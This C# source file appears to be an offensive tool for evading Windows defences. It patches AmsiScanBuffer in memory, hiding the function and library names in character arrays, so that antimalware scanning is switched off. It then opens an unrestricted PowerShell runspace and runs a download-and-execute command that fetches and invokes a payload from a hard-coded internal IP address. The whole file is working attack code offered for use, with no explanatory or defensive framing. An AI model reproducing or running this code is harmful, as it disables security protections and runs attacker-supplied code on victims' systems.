﻿using System;
using System.Collections.ObjectModel;
using System.Runtime.InteropServices;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass { 
    public class BypassCLM
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        static int Bypass()
        {
            char[] chars = { 'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r' };
            String funcName = string.Join("", chars);
            
            char[] chars2 = { 'a', 'm', 's', 'i', '.', 'd', 'l', 'l' };
            String libName = string.Join("", chars2);
            
            IntPtr Address = GetProcAddress(LoadLibrary(libName), funcName);

            UIntPtr size = (UIntPtr)5;
            uint p = 0;

            VirtualProtect(Address, size, 0x40, out p);
            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            Marshal.Copy(Patch, 0, Address, 6);

            return 0;

        }
        public static void Main(String[] args)
        {
            Runspace run = RunspaceFactory.CreateRunspace();
            run.Open();

            Console.WriteLine(Bypass());

            PowerShell shell = PowerShell.Create();
            shell.Runspace = run;

            String exec = "iex(new-object net.webclient).downloadstring('http://192.168.0.103/payload')";  // Modify for custom commands
            shell.AddScript(exec);
            shell.Invoke();

            Collection<PSObject> output = shell.Invoke();
            foreach (PSObject o in output)
            {
                Console.WriteLine(o.ToString());
            }

            foreach (ErrorRecord err in shell.Streams.Error)
            {
                Console.Write("Error: " + err.ToString());
            }
            run.Close();

        }
    }

}
